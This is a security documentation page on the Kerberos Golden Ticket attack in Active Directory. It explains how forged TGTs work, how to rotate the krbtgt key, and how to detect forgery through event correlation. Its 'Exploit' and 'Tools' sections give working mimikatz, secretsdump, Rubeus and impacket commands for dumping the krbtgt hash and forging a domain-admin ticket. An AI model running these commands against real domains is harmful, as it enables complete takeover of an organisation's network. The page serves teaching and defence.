# Golden Ticket

Forging Ticket-Granting Tickets with the KRBTGT account key.

**MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/) Steal or Forge Kerberos Tickets: Golden Ticket

A Golden Ticket is a forged TGT encrypted with the `krbtgt` account's secret key. Because every
domain controller uses this key to validate TGTs, a forged ticket is accepted as legitimate by
every KDC in the domain. The attacker can claim any group membership and any ticket lifetime,
and the KDC copies those claims into the service tickets it issues. The one thing a patched KDC
checks against the directory is that the claimed account name still resolves to the SID
recorded in the ticket (see the note under [How It Works](#how-it-works)).

This is the most powerful persistence technique in Active Directory. A single key compromise
grants complete domain control until that key is rotated.

---

## How It Works

During the [TGS Exchange](../../protocol/tgs-exchange.md), the client presents a TGT to the KDC.
The KDC decrypts the TGT using the `krbtgt` account's key, reads the
[PAC](../../protocol/tickets.md#pac), and uses the PAC contents to build service tickets. The KDC
trusts the decrypted PAC contents without cross-referencing them against the Active Directory
database - with one exception: per [MS-KILE &sect;3.3.5.7.1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/e19be8b8-9130-40a4-9cd1-92d0cbd46a51), TGTs older than 20 minutes trigger
an account-revocation check (disabled, expired, locked, outside logon hours) against AD.

!!! note "What the later PAC hardening does and does not check"
    The 20-minute figure is the account-revocation check in MS-KILE &sect;3.3.5.7.1: once a TGT is
    older than 20 minutes the KDC re-checks that the account is not disabled, expired, or locked.
    It is not a re-validation of the PAC's group SIDs. CVE-2022-37967
    ([KB5020805](https://support.microsoft.com/help/5020805)) added the extended KDC signature
    over the whole PAC, enforced by default from the July 11, 2023 updates and with no override
    from October 10, 2023. The January 2025 "enforced by default" date belongs to a different
    change: CVE-2024-26248 / CVE-2024-29056
    ([KB5037754](https://support.microsoft.com/help/5037754)), which hardened the PAC Validation
    Protocol. None of these makes the KDC look up group membership again on each TGS-REQ; it
    copies the SIDs from the TGT's PAC. What the KDC does check on every TGS-REQ since
    CVE-2021-42287 is that the TGT's client name still resolves to the `PAC_REQUESTOR_SID`,
    returning `KDC_ERR_TGT_REVOKED` otherwise. See the
    [PAC hardening timeline](../../protocol/tickets.md#pac).

If an attacker possesses the `krbtgt` key, they can construct a TGT from scratch:

1. Build an `EncTicketPart` structure with arbitrary values:
    - **cname**: any username. Since CVE-2021-42287 a name that does not exist in Active
      Directory, or that does not belong with the SID in the PAC, is rejected with
      `KDC_ERR_TGT_REVOKED` (see the note above)
    - **PAC group SIDs**: Domain Admins (512), Enterprise Admins (519), Schema Admins (518), or
      any other groups
    - **endtime/renew-till**: any lifetime (attackers commonly use 10 years)
    - **authtime**: any timestamp
2. Encrypt the `EncTicketPart` with the `krbtgt` key
3. Construct the outer `Ticket` structure with `sname = krbtgt/REALM`
4. Present this forged TGT to the KDC in a TGS-REQ

The KDC decrypts the TGT, reads the PAC, and issues a service ticket with the attacker's chosen
group memberships. The service ticket grants whatever access those groups provide.

!!! danger "No preceding AS Exchange"
    A Golden Ticket bypasses the [AS Exchange](../../protocol/as-exchange.md) entirely. There is no
    `PA-ENC-TIMESTAMP`, no password validation, and no Event 4768 on the domain controller. The
    first KDC interaction is a TGS-REQ with the forged TGT.

### Why Rotation Requires Two Password Changes

Active Directory maintains the current and previous `krbtgt` keys simultaneously to allow
seamless key rotation. When the `krbtgt` password is changed, the KDC stores the new key and
keeps the old one as a fallback. TGTs encrypted with the old key remain valid during the
transition period.

This means:

- **First rotation**: old key becomes the "previous" key; Golden Tickets encrypted with the old
  key still work because the KDC tries the previous key if the current one fails
- **Second rotation**: the original compromised key is no longer stored; Golden Tickets encrypted
  with it stop working

The second rotation must occur **after replication completes** across all domain controllers. If
the second change happens before all DCs have replicated the first, some DCs may still accept the
compromised key. It must also wait out the ticket lifetime: Microsoft's procedure is to "wait 10
hours between password resets", because 10 hours is the default maximum lifetime for user and
service tickets, and longer if the Kerberos policy sets a longer lifetime
([Reset the krbtgt password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)).
A second reset before then invalidates tickets that legitimate users still hold.

---

## Defend

### KRBTGT Password Rotation

Rotate the `krbtgt` password **twice**, with a full replication cycle and at least the maximum
ticket lifetime between changes. Microsoft Defender for Identity flags a `krbtgt` password
"last set over 180 days ago"
([Change password for krbtgt account](https://learn.microsoft.com/en-us/defender-for-identity/change-password-krbtgt-account)),
so rotate at least that often, and immediately after any suspected compromise. The full
procedure is under
[KRBTGT Password Rotation](../../security/mitigations.md#priority-9-krbtgt-password-rotation).

```powershell title="Check when the krbtgt password was last set"
# Check when krbtgt password was last set
Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet
```

!!! warning "Don't rush the second rotation"
    Wait at least 10 hours between the first and second `krbtgt` password changes (Microsoft's
    figure: the default maximum ticket lifetime; use your own value if the Kerberos policy sets
    a longer one), and confirm that all domain controllers have replicated the first change. The
    wait is for outstanding tickets to expire, not only for replication. Premature second
    rotation can cause authentication outages.

### Restrict DCSync Privileges

The `krbtgt` hash is most commonly obtained through DCSync - replicating credentials from a
domain controller over the network. Only these principals should have the
`Replicating Directory Changes All` permission:

- Domain Controllers (computer accounts)
- Domain Admins (inherently)
- Azure AD Connect (if hybrid)

Audit this regularly:

```powershell title="Find principals with DCSync rights on the domain object"
# Find principals with DCSync rights
(Get-Acl "AD:DC=corp,DC=local").Access |
    Where-Object { $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" } |
    Select-Object IdentityReference
```

### Tiered Administration

Tier 0 credentials (Domain Admins, DC computer accounts) must never be exposed on Tier 1 or Tier
2 systems. If an attacker compromises a workstation where a Domain Admin has logged in, they can
extract that credential and use it to DCSync the `krbtgt` hash.

### PAC Validation

PAC validation does not stop a Golden Ticket, and the `ValidateKdcPacSignature` registry value
is not a mitigation for it. In PAC validation a server sends the
[PAC signatures](../../protocol/tickets.md#pac-signatures) of a service ticket to a domain
controller, which checks them with the `krbtgt` key. Service tickets obtained with a Golden
Ticket are issued by the real KDC, which signs their PACs itself, so the check passes. The
check is also skipped altogether for services that run as Local System, Network Service, or
Local Service, or that hold `SeTcbPrivilege`, whatever the registry value says (see
[Silver Ticket - Defend](silver-ticket.md#enable-pac-validation)).

The checks that do bear on forged TGTs run on the KDC and arrive with updates, not settings:
see the [PAC hardening timeline](../../protocol/tickets.md#pac-hardening-timeline), and keep
every domain controller current.

---

## Detect

Golden Tickets are difficult to detect because the forged TGT is cryptographically valid. Detection
relies on identifying anomalies in the ticket metadata or usage patterns.

### Missing AS Exchange

A Golden Ticket is used directly in a TGS-REQ without a preceding AS-REQ. Look for:

- **Event 4769** (TGS request) for a user **without** a matching **Event 4768** (TGT request)
  from the same user in the expected timeframe
- This requires correlating 4768 and 4769 events - a missing 4768 before a 4769 is suspicious

A missing 4768 is a lead, not proof, and a raw query for it also matches normal activity.
Event 4768 is written once, when the TGT is issued, and only on the domain controller
that issued it; the 4769 can be on any other domain controller and can follow as late as the
TGT remains usable (10 hours by default, longer for a ticket that is renewed, up to the 7-day
default renewal limit). Collect both events from every domain controller, and search back over
the whole renewal period, before treating an unmatched 4769 as suspicious. Both subcategories
must be enabled: Audit Kerberos Authentication Service for 4768 and Audit Kerberos Service
Ticket Operations for 4769 (see
[Kerberos Auditing Policies](../../security/group-policy.md#kerberos-auditing-policies)).

### Anomalous Ticket Metadata

Most of these properties are inside the ticket and are not written to the Security log: event
4769 records the requesting account's name and the service's SID, but no ticket lifetime and no
client SID or PAC contents. Seeing them takes a product that decodes tickets or the KDC's own
rejections, as noted per row.

| Anomaly | What to look for |
|---|---|
| Ticket lifetime | TGTs with lifetimes far exceeding the 10-hour domain default (e.g., 10 years) |
| Non-existent users | Service ticket requests for usernames that do not exist in Active Directory. A patched KDC rejects these with `KDC_ERR_TGT_REVOKED`; the log evidence is KDC System event 38 (next row) |
| SID mismatch | The SID in the PAC does not match the SID associated with the username in AD. The KDC makes this comparison itself since CVE-2021-42287 and logs a mismatch as System event 38 (source `Microsoft-Windows-Kerberos-Key-Distribution-Center`). In this site's lab (Server 2022 build 20348.3207) the rejected request produced event 38 and no event 4769 |
| Domain field | Empty or incorrect domain name in the ticket |
| Missing fields | Fields that a legitimate KDC always populates but an attacker's tool omitted |

### Behavioral Indicators

- A user suddenly accessing resources they have never accessed before
- Lateral movement patterns inconsistent with the user's role
- Service ticket requests from IP addresses not associated with the claimed user

### Advanced Detection

Microsoft Defender for Identity can detect Golden Ticket usage by comparing PAC contents against
Active Directory. Custom SIEM rules can look for:

- KDC System event 38, logged when a TGT's client name does not resolve to its
  `PAC_REQUESTOR_SID` and the KDC returns `KDC_ERR_TGT_REVOKED`. Do not build this on event
  4769: it has no client SID field, and although Microsoft's failure-code table lists `0x14`,
  in this site's lab (Server 2022 build 20348.3207) the rejected request left event 38 and no
  4769
- KDC events in the System log from [KB5008380](https://support.microsoft.com/help/5008380):
  38 (the requestor in the ticket does not match the account), 37 (ticket without the requestor
  buffer), and 36 (ticket without a PAC). The KB attributes 37 to a PAC built by a KDC that
  "does not contain the update or is in Disabled mode" and gives no cause for 36, so on a
  domain where every DC is updated both warrant a look
- TGS requests with anomalous KDC options (the `Ticket Options` field) or encryption types

!!! info "Detection is hard - but improving"
    Because the Golden Ticket is encrypted with the real `krbtgt` key, the cryptographic
    validation at the KDC succeeds. Detection must focus on metadata anomalies and behavioral
    analysis, not cryptographic verification.

    The KDC does add one **server-side** check that matters here. Since CVE-2021-42287
    (KB5008380) it verifies on every TGS-REQ that the TGT's client name still resolves to the
    `PAC_REQUESTOR_SID` in the PAC, and rejects a mismatch with `KDC_ERR_TGT_REVOKED`. A forged
    TGT for a nonexistent user, or one whose name and SID do not belong together, is therefore
    rejected at the KDC. The KDC does not compare the PAC's group SIDs with Active Directory:
    it copies them into the service ticket, so fabricated group memberships for a real account
    still have to be caught by the metadata and behavioral detections above.

---

## Exploit

### Prerequisites

1. **KRBTGT hash** - obtained through one of:
    - DCSync: `mimikatz lsadump::dcsync /user:krbtgt`
    - NTDS.dit extraction: `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
    - Direct domain controller compromise
2. **Domain name** - e.g., `CORP.LOCAL`
3. **Domain SID** - e.g., `S-1-5-21-1111111111-2222222222-3333333333`
4. **Target username** - typically `Administrator`

### Step-by-Step

1. **Obtain the KRBTGT hash**:

    ```
    mimikatz # lsadump::dcsync /user:krbtgt
    ```

    The output includes the NT hash and AES keys for the `krbtgt` account.

2. **Determine the domain SID**:

    ```powershell
    # PowerShell
    (Get-ADDomain).DomainSID.Value
    ```

    ```bash
    # impacket (from Linux)
    lookupsid.py 'CORP.LOCAL/admin:<password>@192.0.2.10'
    ```

3. **Forge the Golden Ticket**:

    ```
    mimikatz # kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:<ntlm_hash> /user:administrator /groups:512,513,518,519,520 /ptt
    ```

    This creates a forged TGT claiming to be `administrator` with Domain Admins (512), Domain
    Users (513), Schema Admins (518), Enterprise Admins (519), and Group Policy Creator Owners
    (520) group memberships, and injects it into the current session.

4. **Use the forged TGT**:

    ```
    # Access any resource as administrator
    dir \\dc1.corp.local\c$
    ```

    The forged TGT is sent to the KDC in a TGS-REQ. The KDC decrypts it, reads the PAC, and
    issues a service ticket with Domain Admin privileges.

---

## Tools

!!! info "kerbwolf does not implement Golden Ticket forging"
    Golden Ticket creation requires the `krbtgt` key, which is a post-compromise persistence
    technique. kerbwolf focuses on the authentication exchange, not ticket forging.

| Tool | Command | Notes |
|---|---|---|
| mimikatz | `kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:<hash> /user:administrator /ptt` | Forges TGT and injects into memory |
| Rubeus | `Rubeus.exe golden /rc4:<hash> /user:administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /ptt` | Supports RC4 and AES keys |
| impacket | `ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL administrator` | Outputs ccache file |
